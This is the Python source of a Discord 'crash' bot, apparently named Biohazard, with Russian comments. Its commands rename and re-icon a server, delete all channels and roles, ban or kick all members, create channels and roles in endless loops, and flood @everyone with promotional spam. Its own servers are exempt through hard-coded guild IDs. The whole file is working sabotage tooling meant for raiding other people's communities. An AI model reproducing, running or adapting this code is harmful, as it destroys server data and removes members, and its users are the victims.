import discord
import asyncio
from discord.ext import commands
import os
import time
token = os.environ.get('TOKENZ') #токен
print('Ожидание входа...')
class MyClient(discord.Client):
	async def on_ready(self):
		print('Вошёл как', self.user)
		while True:
			await client.change_presence(activity = discord.Game('Крутой бот | v2.0'))
			time.sleep(10)
			await client.change_presence(activity = discord.Game('Анти-рейд | v2.0'))
			time.sleep(10)
		
	async def on_message(self, message):
		c = 0
		r = 0
		m = 0
		print('{0.author} с сервера {0.guild.name} сказал: {0.content}'.format(message))
		if message.content == '*помощь': #помощь
			await message.delete()
			embed = discord.Embed(title=":grey_question: Помощь", description="", color=0x00cc00)
			embed.add_field(name='*атака', value='Автоматический краш сервера', inline=False)
			embed.add_field(name='*всембан', value='Забанить всех участников', inline=False)
			embed.add_field(name='*всемкик', value='Кикнуть всех участников', inline=False)
			embed.add_field(name='*канал-', value='Удалить текущий канал', inline=False)
			embed.add_field(name='*каналы-', value='Удалить все каналы', inline=False)
			embed.add_field(name='*каналы+', value='Бесконечное создание каналов', inline=False)
			embed.add_field(name='*переименовать', value='Перименовать сервер', inline=False)
			embed.add_field(name='*роли-', value='Удалить все роли', inline=False)
			embed.add_field(name='*роли+', value='Бесконечное создание ролей', inline=False)
			embed.add_field(name='*флуд', value='Зафлудить текущий канал', inline=False)
			await message.author.send(embed=embed)
		if message.guild.id != 732584678313427008 and message.guild.id != 725752675106291804 and message.guild.id != 741589705094594642 and message.guild.id != 561460998444154881 and message.guild.id != 724533962583834665 and message.guild.id != 707402752166199378:
			if message.content == '*атака': #автоматический краш
				await message.delete() #удаление сообщения
				print('Атака на сервер', message.guild.name)
				await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание сервера
				with open('chaos.jpeg', 'rb') as f:
					icon = f.read()
				await message.guild.edit(icon=icon)
				
				for i in message.guild.channels:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление всех каналов
						print('Канал', i, 'удалён!')
						c = c + 1
					except:
						pass
				await message.author.send('**:wastebasket: Каналов удалено: **' + str(c))
				for i in message.guild.roles:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление всех ролей
						r = r + 1
						print('Роль', i, 'удалена!')
					except:
						pass
				await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
					
				for i in message.guild.members:
					await asyncio.sleep(0.1)
					try:
						await i.ban() #бан всех участников
						print('Участник', i, 'забанен!')
						m = m + 1
					except:
						pass
				await message.author.send('**:hammer: Участников забанено: **' + str(m))
				
				await asyncio.sleep(0.1)
				try:
					while True: #бесконечный цикл
						await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
						await message.guild.create_category('Crash by Biohazard') #создание категории
						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
				except:
					pass
				
			if message.content == '*флуд': #флуд
				await message.delete()
				await asyncio.sleep(0.1)
				try:
					while True: #бесконечный цикл
						await message.channel.send('@everyone Внимание, сервер крашится. С любовью, <:biohazardbot:732584678313427008> Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC') #отправка сообщения
				except:
					pass
				
			if message.content == '*всембан': #бан всех участников
				await message.delete()
				for i in message.guild.members:
					await asyncio.sleep(0.1)
					try:
						await i.ban() #бан
						print('Участник', i, 'забанен!')
						m = m + 1
					except:
						pass
				await message.author.send('**:hammer: Участников забанено: **' + str(m))
					
			if message.content == '*всемкик': #кик всех участников
				await message.delete()
				for i in message.guild.members:
					await asyncio.sleep(0.1)
					try:
						await i.kick() #кик
						m = m + 1
						print('Участник', i, 'кикнут!')
					except:
						pass
				await message.author.send('**:boot: Участников кикнуто: **' + str(m))
					
			if message.content == '*переименовать': #переименовывание сервера
				await message.delete()
				await asyncio.sleep(0.1)
				try:
					await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание
					with open('chaos.jpeg', 'rb') as f:
						icon = f.read()
					await message.guild.edit(icon=icon)
				except:
					pass
				
			if message.content == '*каналы-': #удаление всех каналов
				await message.delete()
				for i in message.guild.channels:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление
						print('Канал', i, 'удалён!')
						c = c + 1
					except:
						pass
				await message.author.send('**:wastebasket: Каналов удалено: ** ' + str(c))
				await message.guild.create_text_channel(name='chat')
						
			if message.content == '*роли-': #удаление всех ролей
				await message.delete()
				for i in message.guild.roles:
					await asyncio.sleep(0.1)
					try:
						await i.delete() #удаление
						print('Роль', i, 'удалена!')
						r = r + 1
					except:
						pass
				await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
					
			if message.content == '*каналы+': #бесконечное создание каналов и категорий
				await message.delete()
				await asyncio.sleep(0.1)
				try:
					while True:
						await message.guild.create_text_channel(name='crash-by-biohazard') #создание текстового канала
						await message.guild.create_category(name='Crash by Biohazard') #создание категории
						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
				except:
					pass
				
			if message.content == '*заразаканалы': #переименовывание всех каналов
				await message.delete()
				for i in message.guild.channels:
					await asyncio.sleep(0.1)
					try:
						await i.edit(name='Crash by Biohazard') #переименовывание
						print('Канал', i, 'переименован!')
						c = c + 1
					except:
						pass
				await message.author.send('**:microbe: Каналов заражено: **' + str(c))
					
			if message.content == '*заразароли': #переименовывание всех ролей
				await message.delete()
				for i in message.guild.roles:
					await asyncio.sleep(0.1)
					try:
						await i.edit(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #переименовывание
						print('Роль', i, 'переименована!')
						r = r + 1
					except:
						pass
				await message.author.send('**:microbe: Ролей заражено: **' + str(r))
					
			if message.content == '*роли+': #бесконечное создание ролей
				await message.delete()
				await asyncio.sleep(0.1)
				try:
					while True:
						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
				except:
					pass
					
			if message.content == '*канал-': #удаление текущего канала
				await message.delete()
				await message.channel.delete()
				await message.author.send(':wastebasket: **Канал** `' + message.channel + '` **удалён безвозвратно!**')
				
			if message.content == '*заразаканал': #заражение текущего канала
				await message.delete()
				await message.channel.edit(name='crash-by-biohazard')
				await message.author.send(':microbe: **Канал** `' + message.channel + '` **заражён!**')
					

client = MyClient()
client.run(str(token))
